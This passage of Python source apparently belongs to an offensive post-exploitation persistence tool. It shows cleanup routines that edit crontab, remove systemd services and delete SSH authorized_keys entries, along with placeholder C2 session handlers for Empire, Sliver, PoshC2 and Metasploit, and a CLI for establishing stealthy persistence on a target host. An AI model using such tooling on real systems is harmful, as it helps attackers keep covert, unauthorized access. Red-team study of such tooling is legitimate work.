                remove_cmd = 'crontab -l | grep -v beacon | crontab -'
                result = subprocess.run(remove_cmd, shell=True, capture_output=True, text=True)
                return {'success': result.returncode == 0, 'error': result.stderr if result.returncode != 0 else None}
                
            elif mechanism.type == PersistenceType.SYSTEMD:
                # Disable and remove systemd service
                remove_cmd = f'systemctl stop {mechanism.name}.service && systemctl disable {mechanism.name}.service && rm -f {mechanism.location}'
                result = subprocess.run(remove_cmd, shell=True, capture_output=True, text=True)
                return {'success': result.returncode == 0, 'error': result.stderr if result.returncode != 0 else None}
                
            elif mechanism.type == PersistenceType.SSH_KEY:
                # Remove SSH key from authorized_keys
                remove_cmd = f'sed -i "/{mechanism.name}/d" ~/.ssh/authorized_keys'
                result = subprocess.run(remove_cmd, shell=True, capture_output=True, text=True)
                return {'success': result.returncode == 0, 'error': result.stderr if result.returncode != 0 else None}
                
            else:
                return {'success': True}  # For placeholder methods
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _terminate_c2_session(self, session: C2Session) -> Dict[str, Any]:
        """Terminate a C2 session."""
        try:
            self.logger.info(f"Terminating C2 session: {session.session_id}")
            
            if session.framework == C2Framework.EMPIRE:
                # Terminate Empire session
                return self._terminate_empire_session(session)
            elif session.framework == C2Framework.SLIVER:
                # Terminate Sliver session
                return self._terminate_sliver_session(session)
            elif session.framework == C2Framework.POSHC2:
                # Terminate PoshC2 session
                return self._terminate_poshc2_session(session)
            elif session.framework == C2Framework.METASPLOIT:
                # Terminate Metasploit session
                return self._terminate_metasploit_session(session)
            else:
                return {'success': True}  # For unknown frameworks
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _terminate_empire_session(self, session: C2Session) -> Dict[str, Any]:
        """Terminate Empire session."""
        try:
            # Empire session termination (placeholder)
            self.logger.info(f"Terminating Empire session {session.session_id}")
            session.active = False
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _terminate_sliver_session(self, session: C2Session) -> Dict[str, Any]:
        """Terminate Sliver session."""
        try:
            # Sliver session termination (placeholder)
            self.logger.info(f"Terminating Sliver session {session.session_id}")
            session.active = False
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _terminate_poshc2_session(self, session: C2Session) -> Dict[str, Any]:
        """Terminate PoshC2 session."""
        try:
            # PoshC2 session termination (placeholder)
            self.logger.info(f"Terminating PoshC2 session {session.session_id}")
            session.active = False
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _terminate_metasploit_session(self, session: C2Session) -> Dict[str, Any]:
        """Terminate Metasploit session."""
        try:
            # Metasploit session termination (placeholder)
            self.logger.info(f"Terminating Metasploit session {session.session_id}")
            session.active = False
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}


def main():
    """Main function for testing the module."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Persistence Module")
    parser.add_argument("--target", required=True, help="Target system IP/hostname")
    parser.add_argument("--framework", choices=['empire', 'sliver', 'poshc2', 'metasploit'], 
                       default='empire', help="C2 framework")
    parser.add_argument("--profile", choices=['stealth', 'default', 'aggressive'], 
                       default='default', help="Persistence profile")
    parser.add_argument("--methods", nargs='+', help="Specific methods to use")
    parser.add_argument("--action", choices=['establish', 'maintain', 'cleanup'], 
                       default='establish', help="Action to perform")
    
    args = parser.parse_args()
    
    # Initialize module
    persistence_module = PersistenceModule(args.target)
    
    if args.action == 'establish':
        results = persistence_module.establish_persistence(
            methods=args.methods,
            framework=args.framework,
            profile=args.profile
        )
        
        print(f"\n=== Persistence Establishment Results ===")
        print(f"Target: {results['target']}")
        print(f"Framework: {results['framework']}")
        print(f"Successful persistence: {len(results['successful_persistence'])}")
        print(f"Stealth score: {results['stealth_score']:.2f}")
        
    elif args.action == 'maintain':
        results = persistence_module.maintain_persistence()
        print(f"\n=== Persistence Maintenance Results ===")
        print(f"Mechanisms maintained: {len(results['mechanisms_maintained'])}")
        
    elif args.action == 'cleanup':
        results = persistence_module.cleanup_persistence()
        print(f"\n=== Persistence Cleanup Results ===")
        print(f"Mechanisms removed: {len(results['mechanisms_removed'])}")


if __name__ == "__main__":
    main()